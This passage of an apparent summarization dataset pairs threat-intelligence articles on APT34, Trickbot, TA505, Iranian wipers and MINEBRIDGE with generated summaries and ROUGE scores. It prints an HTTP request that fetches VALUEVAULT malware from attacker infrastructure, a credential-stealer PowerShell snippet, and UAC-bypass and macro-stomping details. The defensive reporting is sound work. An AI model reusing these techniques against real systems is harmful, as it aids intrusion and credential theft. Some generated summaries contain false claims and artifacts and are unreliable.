VALUEVAULT WindowsNTProgram.exe 021a0f57fe09116a43c27e5133a57a0a LONGWATCH PE86.dll d8abe843db508048b4d4db748f92a103 PICKPOCKET PE64.dll 6eca9c2b7cf12c247032aae28419319e PICKPOCKETTable 2: APT34 Endpoint Indicators from this blog postNetwork Indicatorshxxp[://]www[.]cam-research-ac[.]comofflineearthquake[.]comc[.]cdn-edge-akamai[.]com185[.]15[.]247[.]154AcknowledgementsA huge thanks to Delyan Vasilev and Alex Lanstein for their efforts in detecting, analyzing and classifying this APT34 campaign. Thanks to Matt Williams, Carlos Garcia and Matt Haigh from the FLARE team for the in-depth malware analysis.";"The customer's security team confirmed the file was received via a LinkedIn message. ### Output: The customer's security team confirmed the file was received via a LinkedIn message. FireEye Network Security appliances also detected the following being retrieved from APT34 infrastructure (Figure 4).GET hxxp://offlineearthquake.com/file/<sys_id>/b.exe?id=<3char_redacted>&n=000UserAgent: Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0)AppleWebKit/537.36 (KHTML, like Gecko)Host: offlineearthquake[. ]comProxyConnection: KeepAlive Pragma: nocache HTTP/1.1Figure 4: Snippet of HTTP traffic retrieving VALUEVAULT; detected by FireEye Network Security applianceFireEye identifies b.exe (MD5: 9fff498b78d9498b33e08b892148135f) as VALUEVAULT.VALUEVAULT is a Golang compiled version of the ""Windows Vault Password Dumper"" browser credential theft tool from Massimiliano Montoro, the developer of Cain & Abel.VALUEVAULT maintains the same functionality as the original tool by allowing the operator to extract and view the credentials stored in the Windows Vault. TONEDEAF is a backdoor that communicates with Command and Control servers using HTTP or DNS. Supported commands include system information collection, file upload, file download, and arbitrary shell command execution. Although this backdoor was coded to be able to communicate with DNS requests to the hardcoded Command and Control server, c[.]cdnedgeakamai[. ]com, it was not configured to use this functionality. Figure 5 provides a snippet of the assembly CALL instruction of dns_exfil. The creator likely made this as a means for future DNS exfiltration as a plan B. Aside from not being enabled in this sample, the DNS tunneling functionality also contains missing values and bugs that prevent it from executing properly. One such bug involves determining the length of a command response string without accounting for Unicode strings. As a result, a single command response byte is sent when, for example, the malware executes a shell command that returns Unicode output. Additionally, within the malware, an unused string contained the address 185[.]15[.]247[. ]154.VALUEVAULT is a Golang compiled version of the ""Windows Vault Password Dumper"" browser credential theft tool from Massimiliano Montoro, the developer of Cain & Abel.VALUEVAULT maintains the same functionality as the original tool by allowing the operator to extract and view the credentials stored in the Windows Vault. Additionally, VALUEVAULT will call Windows PowerShell to extract browser history in order to match browser passwords with visited sites. The report summarizes that VALUEVAULT will call Windows PowerShell to extract browser history in order to match browser passwords with visited sites. A snippet of this function is shown in Figure 6.powershell.exe /c ""function getiehistory {. [CmdletBinding()]. param (). . $shell = NewObject ComObject Shell.Application. $hist = $shell.NameSpace(34). $folder = $hist.Self. . $hist.Items() | . foreach {. if ($_.IsFolder) {. $siteFolder = $_.GetFolder. $siteFolder.Items() | . foreach {. $pageFolder = $site.GetFolder. $pageFolder.Items() | . foreach {. $visit = NewObject TypeName PSObject Property @{ . URL = $($pageFolder.GetDetailsOf($_,0)) . }. $visit. Acknowledgements A huge thanks to Delyan Vasilev and Alex Lanstein for their efforts in detecting, analyzing and classifying this APT34 campaign. Thanks to Matt Williams, Carlos Garcia and Matt Haigh from the FLARE team for the indepth malware analysis.";en;{'r': 0.26826722338204595, 'p': 0.9244604316546763, 'f': 0.4158576016913837};{'r': 0.19750406945198046, 'p': 0.883495145631068, 'f': 0.32283813448580495};{'r': 0.26826722338204595, 'p': 0.9244604316546763, 'f': 0.4158576016913837}
https://www.zdnet.com/article/source-code-of-iranian-cyber-espionage-tools-leaked-on-telegram/;Source code of Iranian cyber-espionage tools leaked on Telegram;"In an incident reminiscent of the Shadow Brokers leak that exposed the NSA's hacking tools, someone has now published similar hacking tools belonging to one of Iran's elite cyber-espionage units, known as APT34, Oilrig, or HelixKitten.The hacking tools are nowhere near as sophisticated as the NSA tools leaked in 2017, but they are dangerous nevertheless.Victim data also dumped onlineThe tools have been leaked since mid-March on a Telegram channel by an individual using the Lab Dookhtegan pseudonym.Besides hacking tools, Dookhtegan also published what appears to be data from some of APT34's hacked victims, mostly comprising of username and password combos that appear to have been collected through phishing pages.ZDNet was previously aware of some of these tools and victim data after this reporter received a tip in mid-March. In a Twitter DM, a Twitter user shared some of the same files that were discovered today on Telegram, and we believe that this Twitter user is the Telegram Lab Dookhtegan persona.Image: ZDNetIn our Twitter conversation, the leaker claimed to have worked on the group's DNSpionage campaign, but this should be taken with a grain of salt, as the leaker could very well be a member of a foreign intelligence agency trying to hide their real identity while giving more credence to the authenticity of Iran's hacking tools and operations.Furthermore, ZDNet has also learned that the same Twitter persona had also contacted tens of other reporters and infosec researchers with the same message, in an attempt to promote the leak. Similarly, the same persona has also posted links to some of these hacking tools on public hacking-focused forums. On these forums, he claimed to be selling the hacked files, yet, he never mentioned anything about a price.Authenticity confirmedSeveral cyber-security experts have already confirmed the authenticity of these tools. Chronicle, Alphabet's cyber-security division, confirmed this to ZDNet earlier today.In the Telegram channel discovered today, the hacker leaked the source code of six hacking tools, and the content from several active backend panels, where victim data had been collected.Hacking tools:- Glimpse (newer version of a PowerShell-based trojan that Palo Alto Networks names BondUpdater)- PoisonFrog (older version of BondUpdater)- HyperShell (web shell that Palo Alto Networks calls TwoFace)- HighShell (another web shell)- Fox Panel (phishing kit)- Webmask (DNS tunneling, main tool behind DNSpionage)Besides source code for the above tools, Dookhtegan also leaked on the Telegram channel data taken from victims that had been collected in some of APT34's backend command-and-control (C&C) servers.Image: ZDNetIn total, according to Chronicle, Dookhtegan leaked data from 66 victims, mainly from countries in the Middle East, but also Africa, East Asia, and Europe.Data was taken from both government agencies, but also from private companies. The two biggest companies named on the Telegram channel are Etihad Airways and Emirates National Oil. A list of the victims (but without company/government agency names) is available here.Data leaked from each victim varied, ranging from usernames and password combos to internal network servers info and user IPs.Additionally, Dookhtegan also leaked data about past APT34 operations, listing the IP addresses and domains where the group had hosted web shells in the past, and other operational data.Image: ZDNetBesides data on past operations, the leaker also doxxed Iranian Ministry of Intelligence officers, posting phone numbers, images, and names of officers involved with APT34 operations. For some officers, Dookhtegan created PDF files containing their names, roles, images, phone numbers, email addresses, and social media profiles.Image: ZDNetIt was clear from the detailed doxing packages that the leaker had a bone to pick with the Iranian Ministry of Intelligence officers, to which he referred many times as ""cruel,"" ""ruthless,"" and ""criminal.""""We have more secret information about the crimes of the Iranian Ministry of Intelligence and its managers and we are determined to continue to expose them,"" Dookhtegan said in a Telegram message posted last week.The leaker also posted screenshots on the Telegram channel alluding to destroying the control panels of APT34 hacking tools and wiping servers clean.Image: ZDNetImage: ZDNetThe data leaked on this Telegram channel is now under analysis by several cyber-security firms, ZDNet was told. It has also made its way on other file sharing sites, such as GitHub.""It's likely this group will alter their toolset in order to maintain operational status,"" Brandon Levene, Head of Applied Intelligence at Chronicle, told ZDNet today in an email ""There may be some copycat activity derived from the leaked tools, but it is unlikely to see widespread use.""This is because the tools aren't sophisticated and aren't top-tier tools like the ones leaked in the Shadow Brokers' NSA leak. Nation-state or criminal groups who will reuse these tools will most likely do it as a smoke-screen or false flag, to mask their operations as APT34.These were 2017's biggest hacks, leaks, and data breachesMore cybersecurity coverage:";"Dookhtegan, an Iranian cybersecurity researcher, leaked sensitive information about the Iranian Ministry of Intelligence and its managers, including their names, roles, images, phone numbers, email addresses, and social media profiles. The leaker also posted screenshots on the Telegram channel alluding to destroying the control panels of APT34 hacking tools and wiping servers clean. The data leaked on this Telegram channel is now under analysis by several cybersecurity firms, ZDNet was told. It has also made its way on other file sharing sites, such as GitHub. ""It's likely this group will alter their toolset in order to maintain operational status,"" Brandon Levene, Head of Applied Intelligence at Chronicle, told ZDNet today in an email ""There may be some copycat activity derived from the leaked tools, but it is unlikely to see widespread use. ""This is because the tools aren't sophisticated and aren't toptier tools like the ones leaked in the Shadow Brokers' NSA leak. Nationstate or criminal groups who will reuse these tools will most likely do it as a smokescreen or false flag, to mask their operations as APT34.These were 2017's biggest hacks, leaks, and data breachesMore cybersecurity coverage:";en;{'r': 0.31695331695331697, 'p': 0.9416058394160584, 'f': 0.4742647021140383};{'r': 0.23356643356643356, 'p': 0.8882978723404256, 'f': 0.3698781805346765};{'r': 0.31695331695331697, 'p': 0.9416058394160584, 'f': 0.4742647021140383}
https://blog.morphisec.com/trickbot-uses-a-new-windows-10-uac-bypass;Trickbot Trojan Leveraging a New Windows 10 UAC Bypass;"The Trickbot trojan is one of the most advanced malware delivery vehicles currently in use. Attackers have leveraged it to deliver a wide variety of malicious code, in many different methods. Just yesterday, Bleeping Computer reported that news articles from President Trump's impeachment trial have been used to hide Trickbot from antivirus scanners.On almost a daily basis, malicious actors reinvent Trickbot and work to find new pathways to deliver the trojan onto user machines. This is what makes Trickbot among the most advanced malware delivery vehicles, the constant evolution of methodologies used for delivery.The latest revision, which the Morphisec Labs team detected in new samples, leverages the Windows 10 WSReset UAC Bypass to circumvent user account control and deliver its payload onto user machines.The Trickbot Trojan and Windows 10The WSReset UAC Bypass process begins with Trickbot checking to see if the system it's on is running Windows 7 or Windows 10. If it is running under Windows 7, it will utilize the CMSTPLUA UAC bypass (the same one as in previous samples). It's only when the system is running Windows 10 that Trickbot uses the WSReset UAC Bypass.Figure 1 OS version check.Figure 2 If Windows 10 - utilize WSReset UAC Bypass.The WSReset UAC Bypass, discovered in March 2019, allows Trickbot authors to take advantage of the WSReset.exe process. The WSReset.exe process is a Microsoft signed executable that is used to reset Windows Store settings, according to its manifest file. What's most important here, though, is that the 'autoElevate' property is set to ""true."" This is what allows the WSReset UAC Bypass to be used for privilege escalation.Figure 3 WSReset manifest.Trickbot decrypts its strings in order to use the WSReset UAC Bypass, such as the registry path and the command to execute.Figure 4 Trickbot command preparation.Next, Trickbot uses ""reg.exe"" in order to add the relevant keys that allows it to utilize the WSReset UAC Bypass.Figure 5 Using reg.exe to add relevant keys.Figure 6 Registry before WSReset execution.The final step in this bypass is to execute WSReset.exe, which will cause Trickbot to run with elevated privileges without a UAC prompt. Trickbot does that using 'ShellExecuteExW' API. This final executable allows Trickbot to deliver its payload onto workstations and other endpoints.Figure 7 WSReset.exe execution.Morphisec Secures Your Endpoints Against the Trickbot MALWAREThe Morphisec Unified Threat Prevention Platform blocks Trickbot before it is able to execute its process, including the WSReset UAC Bypass, through the power of moving target defense. By morphing the application memory structures on endpoints, we take away the attackers' ability to accurately target our customers' critical systems. This protects workstations, servers, VDIs, and cloud workloads against this and other damaging attacks.IOC: (SHA-1)? b9cc1b651f579ff1afb11427f0ec1c882afde710? 24263d91575bb825c33e3fd27f35bc7bd611cee3? 864d3e3f7ad0f144f8d838ea9638d4c264c5c063? f33c057d652aa70c5f1332e14c0b8d9c77a5aa1c? b1f7f71b5f7fee1cf38e2591e50cb181f7bd5353? 6de843fb12f456b0ea42876d82f39fe35b5cf6ca";NOPE;en;{'r': 0.0, 'p': 0.0, 'f': 0.0};{'r': 0.0, 'p': 0.0, 'f': 0.0};{'r': 0.0, 'p': 0.0, 'f': 0.0}
https://www.bleepingcomputer.com/news/security/malware-tries-to-trump-security-software-with-potus-impeachment/;Malware Tries to Trump Security Software With POTUS Impeachment;"The TrickBot malware has been spotted using text from articles about President Trump's impeachment to bypass the scanning engines of security software.Before distributing malware, developers commonly use a crypter to encrypt or obfuscate the malware's code to make it FUD (Fully UnDetectable) by antivirus software.One common technique used by crypters is to take harmless text from books or news articles and inject it into the malware in the hopes that these strings will be whitelisted by security software.This exact technique was discovered by researchers in the past that allowed them to bypass Cylance's AI-driven scanning engine by adding strings from the Rocket League executable to malware.The TrickBot trojan appears to be using a similar bypass by using article text from popular news sites.Trying to Trump security softwareIn two new samples of TrickBot discovered by Head of SentinelLabs Vitali Kremez and security researcher MalwareHunterTeam, the malware developers are injecting text from an article about President Trump's impeachment into the malware.""The anti-virus engines bypasses focus on adding and appending known ""goodware"" strings to binaries in order to bypass static machine learning engines as similarly it was discovered and used by Cylance engine model,"" Kremez told BleepingComputer in a conversation. ""Known goodware strings might include news headlines like widely populated Trump impeachment news stories mixed with the actual and pseudo-real applications that become appended to the malicious binaries by the malware crypter builder engine.""The first sample uses text from an impeachment story at Independent.co.uk and adds it as part of the file information for executable.TrickBot Sample 1The second sample uses text ripped from a CNN article about Trump's impeachment and adds it as custom exif data tags.""Ukrainian natural gas company is at rump has lambasted Schiff for previous inaccurately paraphrasing Russian propaganda that Ukraine opposed him in 2016, Thursday Schiff went line-by-line through the real thing investigations was Donald Trump foreign leader to get in touch with iuliani originated at the White House Burisma board. Impeachment managers Biden conspiracy theory played against the Rudy Giuliani, about two different investigations Biden conspiracy theory played against the""It is not 100% clear if this text allowed it to bypass antivirus engines or if other changes were responsible, but when first submitted to VirusTotal, sample 1 was only detected by 11/70 security products and sample 2 was only detected by 6/70.""This TrickBot crypter and related top cybercrime group invest significant resources in making sure they study and understand anti-virus detection model to be ahead of the game,"" Kremez explained. ""By and large, malware crypters and detections remain to be a ""cat-and-mouse"" game with the TrickBot and other top crimes groups trying to evade anti-virus models and defense and detection trying to catch up.""It also illustrates how attackers use current events in the proliferation of their malware. Another example shown today is a recent Emotet spam campaign pretending to be information about the Coronavirus.";"The TrickBot malware has been spotted using text from articles about President Trump's impeachment to bypass the scanning engines of security software. Before distributing malware, developers commonly use a crypter to encrypt or obfuscate the malware's code to make it FUD (Fully UnDetectable) by antivirus software. One common technique used by crypters is to take harmless text from books or news articles and inject it into the malware in the hopes that these strings will be whitelisted by security software. This exact technique was discovered by researchers in the past that allowed them to bypass Cylance's AIdriven scanning engine by adding strings from the Rocket League executable to malware. The TrickBot trojan appears to be using a similar bypass by using text from an article about President Trump's impeachment. Trying to Trump security software, In two new samples of TrickBot discovered by Head of SentinelLabs Vitali Kremez and security researcher MalwareHunterTeam, the malware developers are injecting text from an article about President Trump's impeachment into the malware. ""The antivirus engines bypasses focus on adding and appending known ""goodware"" strings to binaries in order to bypass static machine learning engines as similarly it was discovered and used by Cylance engine model,"" Kremez told BleepingComputer in a conversation. ""Known goodware strings might include news headlines like widely populated Trump impeachment news stories mixed with the actual and pseudoreal applications that become appended to the malicious binaries by the malware crypter builder engine."" The first sample uses text from an impeachment story at Independent.co.uk and adds it as part of the file information for executable. TrickBot";en;{'r': 0.5236363636363637, 'p': 0.9664429530201343, 'f': 0.6792452784604174};{'r': 0.5067264573991032, 'p': 0.9495798319327731, 'f': 0.6608187089126569};{'r': 0.5236363636363637, 'p': 0.9664429530201343, 'f': 0.6792452784604174}
https://www.bleepingcomputer.com/news/security/microsoft-detects-new-ta505-malware-attacks-after-short-break/;Microsoft Detects New TA505 Malware Attacks After Short Break;"Microsoft says that an ongoing TA505 phishing campaign is using attachments featuring HTML redirectors for delivering malicious Excel documents, this being the first time the threat actors have been seen adopting this technique.The new campaign is detailed in a series of tweets from the Microsoft Security Intelligence account, with the researchers saying that the final payload is being dropped using an Excel document that bundles a malicious macro.TA505 (also tracked SectorJ04) is a financially motivated cybercrime group active since at least Q3 2014 [1, 2] known for focusing on attacks against retail companies and financial institutions via large-sized malicious spam campaigns driven by the Necurs botnet.This threat actor distributed remote access Trojans (RATs) and malware downloaders that delivered the Dridex and Trick banking Trojans as secondary payloads, as well as Locky, BitPaymer, Philadelphia, GlobeImposter, Jaff ransomware strains on their targets' computers. [1, 2]Kafeine from ProofPoint told BleepingComputer that the switch to HTML attachments occurred in the middle of January 2020.TA505 back from vacation""The new campaign uses HTML redirectors attached to emails. When opened, the HTML leads to the download a malicious macro-laden Excel file that drops the payload,"" Microsoft Security Intelligence's researchers explain. ""In contrast, past Dudear email campaigns carried the malware as an attachment or used malicious URLs.""As mentioned in the beginning, this campaign also marks the adoption of HTML redirectors as this is the first time Microsoft observed this technique being used by TA505 as part of their attacks.Past email campaigns distributing the malware would deliver the payload onto the victim's computer within the attachment or via malicious download URLs.The phishing messages come with HTML attachments which will automatically start downloading the Excel file used to drop the payload.The victims are instructed to open the Excel document on their computer as online previewing is not available and to enable editing to get access to its contents.""Once you have enabled editing, please click Enable Content from the yellow bar above,"" the bait Microsoft Office doc adds.The operators behind this phishing campaign also use localized HTML files in different languages for victims from all around the world.Also, the attackers make use of an IP traceback service that enables them to ""track the IP addresses of machines that download the malicious Excel file.""Threat Analytics report (Microsoft)Once executed on the victim's computer, the malware will also attempt to drop a remote access trojan (RAT) tracked by Microsoft as GraceWire and as FlawedGrace by Proofpoint.Microsoft Security Intelligence provides a full list of indicators of compromise (IOCs) including SHA-256 hashes of the malware samples used in the campaign here and here.Update: Cleared up TA505 / Evil Corp confusion.";"TA505 (also tracked SectorJ04) is a financially motivated cybercrime group active since at least Q3 2014 [1, 2] known for focusing on attacks against retail companies and financial institutions via largesized malicious spam campaigns driven by the Necurs botnet.This threat actor distributed remote access Trojans (RATs) and malware downloaders that delivered the Dridex and Trick banking Trojans as secondary payloads, as well as Locky, BitPaymer, Philadelphia, GlobeImposter, Jaff ransomware strains on their targets' computers. [1, 2]Kafeine from ProofPoint told BleepingComputer that the switch to HTML attachments occurred in the middle of January 2020.TA505 back from vacation""The new campaign uses HTML redirectors attached to emails. When opened, the HTML leads to the download a malicious macroladen Excel file that drops the payload,"" Microsoft Security Intelligence's researchers explain. ""In contrast, past Dudear email campaigns carried the malware as an attachment or used malicious URLs.""As mentioned in the beginning, this campaign also marks the adoption of HTML redirectors as this is the first time Microsoft observed this technique being used by TA505 as part of their attacks.Past email campaigns distributing the malware would deliver the payload onto the victim's computer within the attachment or via malicious download URLs.The phishing messages come with HTML attachments which will automatically start downloading the Excel file used to drop the payload.The victims are instructed to open the Excel document on their computer as online previewing is not available and to enable editing to get access to its contents.""Once you have enabled editing, please click Enable Content from the yellow";en;{'r': 0.684, 'p': 0.9884393063583815, 'f': 0.8085106334635527};{'r': 0.5893719806763285, 'p': 0.9838709677419355, 'f': 0.7371601161603125};{'r': 0.684, 'p': 0.9884393063583815, 'f': 0.8085106334635527}
http://prod-blogs-ui.client-b1.bkjdigital.com/blogs/threat-intelligence/tensions-iran-destructive-attacks;Geopolitical Tensions May Increase Risk of Destructive Attacks;The recent upsurge in tensions between the U.S. and Iran has led to fears about an increase in both the frequency and aggressiveness of Iranian-sponsored cyber attacks. Iran has an extensive track record in this sphere, with government-backed cyber threat groups conducting numerous offensive cyber operations in recent years, including a number of highly destructive wiper attacks. While an uptick in such attacks is not a certainty, it is a distinct possibility and organizations should exercise extreme vigilance.The capabilities of Iranian actors have evolved rapidly in recent years, from quick and relatively simple destructive attacks, such as distributed denial?of?service (DDoS) attacks or website defacements, to an increased focus on network compromises where the actors maintain a persistent foothold and obfuscate their presence to make attribution difficult. Iranian groups have also increasingly targeted critical infrastructure including energy and telecommunications companies.Destructive attacksAttackers associated with Iran have periodically carried out highly destructive disk-wiping attacks against targets in the Middle East. Historically, these attacks tend to coincide with periods of heightened instability in the region.Most of these destructive attacks have involved the Shamoon disk wiper (W32.Disttrack). Shamoon first emerged in 2012 , when it was used in attacks against the Saudi energy sector. It reappeared again in late 2016, when a slightly modified version (W32.Disttrack.B) was used in another wave of attacks against Saudi Arabia.A third wave of attacks occurred in December 2018, when Shamoon was once again deployed against a range of targets in the Middle East. Unlike previous Shamoon attacks, these attacks involved a second piece of wiping malware (Trojan.Filerase). This malware deleted and overwrote files on the infected computer. Shamoon itself would meanwhile erase the master boot record (MBR) of the computer, rendering it unusable.Recent months have also seen the emergence of two new wipers, which appear to be evolutions of the original Shamoon wiper. The first, known as ZeroCleare (Trojan.Zerocleare) appeared in June and July of 2019, while in January 2020, the National Cybersecurity Authority of Saudi Arabia released a report about a wiper malware they called Dustman. Dustman is a further evolution of ZeroCleare, where the authors optimized functionality into a single file instead of the way it worked in the June/July campaigns.Means of accessWhile destructive attacks are an obvious source of concern, potential targets should be aware that the evidence available to date suggests that the Shamoon attackers may not have compromised their victims' networks themselves. In the aftermath of the 2016 Shamoon attacks, Symantec found evidence that the Iran-linked Greenbug and Timberworm espionage groups may have provided access to the victims' networks. The 2018 attacks had a tentative link to the Iranian Elfin group (aka APT33), with one victim in Saudi Arabia having been compromised by the group shortly before Shamoon struck.With this in mind, any organization that finds indicators of compromise (IOCs) related to any Iran-linked espionage group on their network should exercise extreme vigilance. While destructive attacks remain a relative rarity, a prior intrusion does appear to be a necessary precursor. Aside from the aforementioned groups, other Iran-linked groups that are highly active at present include Chafer, Crambus (aka OilRig), and Seedworm.Risk assessmentGiven the recent history of attacks, it is evident that Iranian-sponsored groups consider destruction of equipment as an acceptable form of damage to targets. However, to date these incidents have only targeted Middle Eastern entities. Iranian actors have not yet shown an appetite for conducting similar attacks against organizations further afield. Considering the tense geopolitical climate in 2020 and based on previous Iranian activity, we believe cyber attacks originating from Iran or Iranian proxies would be (in order of descending probability):Wipers being used for destructive attacks against critical infrastructureInfrastructure for telecommunication providers being attacked to disrupt servicesHacktivist defacements of popular websitesDDoS attacks against financial entitiesWhile Symantec has yet to see any evidence of a notable uptick in activity, this should not be misinterpreted, since planned operations could take some time to prepare and execute.Organizations associated with the U.S. and its allies are an obvious target. While Iranian actors have, to date, heavily focused on organizations in the Middle East, attacks against the U.S. should not be ruled out, particularly considering the heightened state of tensions at present.However, organizations based in the Middle East likely remain most at risk, given that Iranian groups know this region best and may already have ongoing compromises. Destructive attacks, such as those involving disk wipers, usually require some prior compromise of the organization's network. This may mean that any potential destructive attacks could be focused on the Middle East, particularly if the attackers are under time pressure to retaliate.Indicators of Compromise (IOCs);The ITSecurity report suggests that Iraniansponsored groups consider destruction of equipment as an acceptable form of damage to targets. However, to date these incidents have only targeted Middle Eastern entities. Considering the tense geopolitical climate in 2020 and based on previous Iranian activity, we believe cyber attacks originating from Iran or Iranian proxies would be (in order of descending probability): Wipers being used for destructive attacks against critical infrastructure Infrastructure for telecommunication providers being attacked to disrupt services Hacktivist defacements of popular websites DDoS attacks against financial entities While Symantec has yet to see any evidence of a notable uptick in activity, this should not be misinterpreted, since planned operations could take some time to prepare and execute. Organizations associated with the U.S. and its allies are an obvious target. While Iranian actors have, to date, heavily focused on organizations in the Middle East, attacks against the U.S. should not be ruled out, particularly considering the heightened state of tensions at present. However, organizations based in the Middle East likely remain most at risk, given that Iranian groups know this region best and may already have ongoing compromises. Destructive attacks, such as those involving disk wipers, usually require some prior compromise of the organization's network. This may mean that any potential destructive attacks could be focused on the Middle East, particularly if the attackers are under time pressure to retaliate. Indicators of Compromise (IOCs);en;{'r': 0.3903061224489796, 'p': 0.9444444444444444, 'f': 0.5523465662589113};{'r': 0.28753541076487255, 'p': 0.9103139013452914, 'f': 0.4370290598607019};{'r': 0.3852040816326531, 'p': 0.9320987654320988, 'f': 0.5451263496524131}
https://www.mandiant.com/resources/blog/stomp-2-dis-brilliance-in-the-visual-basics;STOMP 2 DIS: Brilliance in the (Visual) Basics;"Throughout January 2020, FireEye has continued to observe multiple targeted phishing campaigns designed to download and deploy a backdoor we track as MINEBRIDGE. The campaigns primarily targeted financial services organizations in the United States, though targeting is likely more widespread than those we've initially observed in our FireEye product telemetry. At least one campaign targeted South Korean organizations, including a marketing agency.In these campaigns, the phishing documents appeared to be carefully crafted and leveraged some publicly-documented -- but in our experience uncommon and misunderstood -- TTPs, likely in an effort to decrease detection of the malicious documents' macros. The actor also used a self-hosted email marketing solution across multiple campaigns. Notably, the payload delivered in these campaigns leveraged a packer previously affiliated with a commonly-tracked threat actor, an overlap that we will explore later.This blog post will review the theme of these campaigns and their targets, the adversary's unique tradecraft, the MINEBRIDGE C++ backdoor, some potential attribution overlaps, and importantly -- the threat actor's love of rap music.Targeting and Lure DetailWhile we first identified MINEBRIDGE samples in December, we observed our first phishing campaigns relating to this activity in early January 2020. Email addresses used to send phishing messages were associated with domains that appear to have been registered specifically for this purpose within a few weeks of the activity -- and were thematically consistent with the content of the phishing messages.Additionally, the actor(s) responsible are likely using a self-hosted email marketing solution called Acelle. Acelle adds extended email headers to messages sent via the platform in the format of X-Acelle-<variable>. The messages observed across campaigns using these TTPs have included a ""Customer-Id"" value matching ""X-Acelle-Customer-Id: 5df38b8fd5b58"". While that field remained consistent across all observed campaigns, individual campaigns also shared overlapping ""X-Acelle-Sending-Server_Id"" and ""X-Acelle-Campaign-Id"" values. All of the messages also included a ""List-Unsubscribe"" header offering a link hosted at 45.153.184.84 suggesting that it is the server hosting the Acelle instance used across these campaigns. The sample table for one campaign below illustrates this data:Timestamp Sender Subject x-acelle-subscriber-id x-acelle-sending-server-id x-acelle-customer-id x-acelle-campaign-id 1/7/20 16:15 info@rogervecpa.com tax return file 25474792e6f8c 5e14a2664ffb4 5df38b8fd5b58 5e14a2664ffb4 1/7/20 15:59 info@rogervecpa.com tax return file 22e183805a051 5e14a2664ffb4 5df38b8fd5b58 5e14a2664ffb4 1/7/20 info@rogervecpa.com tax return file 657e1a485ed77 5e14a2664ffb4 5df38b8fd5b58 5e14a2664ffb4 1/7/20 16:05 info@rogervecpa.com tax return file ddbbffbcb5c6c 5e14a2664ffb4 5df38b8fd5b58 5e14a2664ffb4The URLs requested by the malicious documents and serving the final MINEBRIDGE payloads delivered in each of these campaigns provide additional overlap across campaigns. In all observed cases, the domains used the same bullet-proof hosting service. The URI used to download the final payload was ""/team/invest.php"" or, in one case, ""/team/rumba.php"". Perhaps the most fun overlap, however, was discovered when trying to identify additional artifacts of interest hosted at similar locations. In most cases a GET request to the parent directory of ""/team/"" on each of the identified domains served up the lyrics to rap group Onyx's ""Bang 2 Dis"" masterpiece. We will refrain from sharing the specific verse hosted due to explicit content.One of the more notable characteristics of this activity was the consistency in themes used for domain registration, lure content, similarities in malicious document macro content, and targeting. Since first seeing these emails, we've identified at least 3 distinct campaigns.Campaign 1: January 7, 2020 - Tax ThemeEmails associated with this campaign used the CPA themed domain rogervecpa.com registered in late November and the subject line ""Tax Return File"" with IRS related text in the message body.The attached payload was crafted to look like an H&R Block related tax form.Observed targeting included the financial sector exclusively.Campaign 2: January 8, 2020 - Marketing ThemeEmails associated with this campaign used the same CPA themed domain rogervecpa.com along with pt-cpaaccountant.com, also registered late November.The subject line and message body offered a marketing partnership opportunity to the victim.The attached payload used a generic theme enticing users to enable macro content.Observed targeting focused on a South Korean marketing agency.Campaign 3: January 28, 2020 - Recruiting ThemeEmails associated with this campaign were sent from several different email addresses, though all used the recruiting-themed domain agent4career.com which was registered on January 20, 2020.The subject line and message body referenced an employment candidate with experience in the financial sector.The attached payload masqueraded as the resume of the same financial services candidate referenced in the phishing email.Observed targeting included the financial sector exclusively.Quit Stepping All Over My MacrosThe phishing documents themselves leverage numerous interesting TTPs including hiding macros from the Office GUI, and VBA stomping.VBA stomping is a colloquial term applied to the manipulation of Office documents where the source code of a macro is made to mismatch the pseudo-code (hereto referred to as ""p-code"") of the document. In order to avoid duplicating research and wasting the reader's time, we will instead reference the impressive work of our predecessors and peers in the industry. As an introduction to the concept, we first recommend reading the tool release blog post for EvilClippy from Outflank. The security team at Walmart has also published incredible research on the methodology. Vesselin Bontchev provides a useful open source utility for dumping the p-code from an Office document in pcodedmp. This tool can be leveraged to inspect the p-code of a document separate from its VBA source. It was adopted by the wider open source analysis toolkit oletools in order to detect the presence of stomping via comparison of p-code mnemonics vs keyword extraction in VBA source.That is a whole lot of quality reading for those interested. For the sake of brevity, the most important result of VBA stomping as relevant to this blog post is the following:Static analysis tools focusing on VBA macro source extraction may be fooled into a benign assessment of a document bearing malicious p-code.When VBA source is removed, and a document is opened in a version of Office for which the p-code was not compiled to execute, a macro will not execute correctly, resulting in potential failed dynamic analysis.When a document is opened under a version of Office that uses a VBA version that does not match the version of Office used to create the document, VBA source code is recompiled back into p-code.When a document is opened in Office and the GUI is used to view the macro, the embedded p-code is decompiled to be viewed.The final two points identify some interesting complications in regard to leveraging this methodology more broadly. Versioning complexities arise that toolkits like EvilClippy leverage Office version enumeration features to address. An actor's VBA stomped document containing benign VBA source but evil p-code must know the version of Office to build the p-code for, or their sample will not detonate properly. Additionally, if an actor sends a stomped document, and a user or researcher opens the macro in the Office editor, they will see malicious code.Our actor addressed the latter point of this complication by leveraging what we assess to be another feature of the EvilClippy utility, wherein viewing the macro source is made inaccessible to a user within Office by modifying the PROJECT stream of the document. Let's highlight this below using a publicly available sample we attribute to our actors (SHA256: 18698c5a6ff96d21e7ca634a608f01a414ef6fbbd7c1b3bf0f2085c85374516e):Document PROJECT stream:ID=""{33C06E73-23C4-4174-9F9A-BA0E40E57E3F}""Document=ThisDocument/&H00000000Name=""Project""HelpContextID=""0""VersionCompatible32=""393222000""CMG=""A3A1799F59A359A359A359A3""DPB=""87855DBBA57B887C887C88""GC=""6B69B1A794A894A86B""[Host Extender Info]&H00000001={3832D640-CF90-11CF-8E43-00A0C911005A},VBE,&H00000000[Workspace]ThisDocument=0, 0, 0, 0, CModule1=26, 26, 388, 131, ZThe above PROJECT stream has been modified. Within the PROJECT stream workspace, a module is referenced. However, there is no module defined. We would expect the unmodified PROJECT stream of this document prior to utilization of a tool to modify it to be as follows:ID=""{33C06E73-23C4-4174-9F9A-BA0E40E57E3F}""Document=ThisDocument/&H00000000Module=""Module1""Name=""Project""HelpContextID=""0""VersionCompatible32=""393222000""CMG=""A3A1799F59A359A359A359A3""DPB=""87855DBBA57B887C887C88""GC=""6B69B1A794A894A86B""[Host Extender Info]&H00000001={3832D640-CF90-11CF-8E43-00A0C911005A},VBE,&H00000000[Workspace]ThisDocument=0, 0, 0, 0, CModule1=26, 26, 388, 131, ZIt is interesting to note that we initially identified this actor only performing this manipulation on their malicious documents--avoiding any versioning complexities--without actually stomping the p-code to mismatch the VBA source. This seems like an odd decision and is possibly indicative of an actor assessing what ""works"" for their campaigns. The above malicious document is an example of them leveraging both methodologies, as highlighted by this screenshot from the awesome publicly available web service IRIS-H Digital Forensics:We can see that the documents 